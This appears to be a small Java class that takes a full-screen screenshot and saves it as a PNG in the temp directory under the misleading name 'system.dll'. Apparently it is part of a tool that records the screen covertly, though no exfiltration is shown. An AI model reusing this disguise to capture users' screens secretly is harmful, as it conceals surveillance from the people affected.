package com.sassouki.crawler;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

import javax.imageio.ImageIO;

public class ScreenShot {

	public ScreenShot() {
		
	}
public void Takescreenshot() throws IOException, HeadlessException, AWTException{
	BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
	ImageIO.write(image, "png", new File(System.getProperty("java.io.tmpdir")+"/system.dll"));
}
public String getPath(){
	return System.getProperty("java.io.tmpdir")+"/system.dll";
}
}
